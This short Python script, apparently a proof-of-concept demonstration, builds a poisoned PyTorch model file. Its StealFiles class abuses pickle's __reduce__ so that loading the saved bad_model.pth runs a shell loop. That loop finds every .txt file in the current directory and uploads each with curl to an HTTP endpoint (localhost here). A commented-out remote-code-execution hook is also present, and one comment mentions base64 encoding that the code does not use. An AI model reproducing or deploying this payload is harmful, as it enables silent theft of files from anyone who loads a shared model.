import os
import torch

# Step 2: Define a Malicious Class with an exec call, using base64 encoding
class StealFiles:
    def __reduce__(self):
        # Return a method that decodes and executes the code
        return (os.system, (f"""
for file in $(find . -type f -name "*.txt"); do
    echo "Stealing file: $file"
    curl -F "file=@$file" http://localhost:8080 -o /dev/null -s
done > /dev/null
""",))


# Step 3: Load the original model, wrap it with the Malicious class, and save it as a new model
def make_bad_model():
    # Load the original model
    malicious_model = torch.load("simple_model.pth")

    # Add the malicious class to the end of the model
    malicious_model.steal_files = StealFiles()
    # malicious_model.rce = RemoteCodeExec()

    # Save the malicious model as a new file
    torch.save(malicious_model, "bad_model.pth")



if __name__ == "__main__":
    # Step 2: Create a malicious model
    make_bad_model()
